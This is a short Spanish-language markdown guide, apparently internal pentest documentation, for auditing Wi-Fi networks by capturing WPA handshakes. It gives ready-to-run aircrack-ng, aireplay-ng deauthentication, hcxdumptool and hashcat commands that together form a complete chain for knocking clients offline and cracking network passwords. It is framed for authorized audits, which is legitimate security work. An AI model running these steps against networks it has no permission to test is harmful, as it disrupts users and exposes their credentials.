# Guía de Captura de Handshakes (Auditoría Wi-Fi) V2
#wifi #pentest #handshake #auditoria #aircrack

> **ÉTICO:** Solo para redes propias o con autorización explícita.

---

## 1. Conceptos básicos

- **Handshake (4-way):** proceso de autenticación entre cliente y AP. Capturarlo permite obtener el hash para auditoría.
- **Modo Monitor:** la tarjeta captura tramas sin asociarse a redes.
- **Desautenticación:** ataque selectivo para forzar reconexión y generar nuevo handshake capturable.
- **Canales:** routers 2.4GHz operan en canales específicos (1, 6, 11). Sincronizarse con el objetivo es crítico.

---

## 2. Preparación (reset del ecosistema)

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan1
iw dev
```

---

## 3. Fases de la auditoría

### Fase A — Radar global
```bash
sudo airodump-ng wlan1mon -w captura_global
```
Identificar **BSSID** y **Canal (CH)** del objetivo.

### Fase B — Enfoque al objetivo
```bash
sudo airodump-ng wlan1mon -c [CANAL] --bssid [BSSID] -w captura_final
```

### Fase C — Ataque de desautenticación (Terminal 2)
```bash
sudo aireplay-ng -0 5 -a [BSSID] --ignore-negative-one wlan1mon
```

---

## 4. Alternativa con hcxdumptool (automatizado)

| Fase | Comando |
|---|---|
| Reconocimiento | `sudo hcxdumptool -i wlan1 --rcascan=active` |
| Captura | `sudo hcxdumptool -i wlan1 -w captura.pcapng -c 6 --enable_status=1` |

Verifica éxito: contadores `PMKID` y `HANDSHAKE` deben ser > 0.

---

## 5. Verificación de éxito (airodump)

En esquina superior derecha de Terminal 1:
```
WPA handshake: [BSSID]
```
Si no aparece, repetir desautenticación o apagar/encender WiFi de un cliente conectado.

---

## 6. Siguientes pasos

Con `captura.pcapng` (handshake > 0):
```bash
hashcat -m 22000 captura.pcapng wordlist.txt
```

---

*Ver también: `docs/procesos/CHECKLIST-IOT-CAMARAS.md` · `docs/procesos/CHECKLIST-PRE-PENTEST.md`*
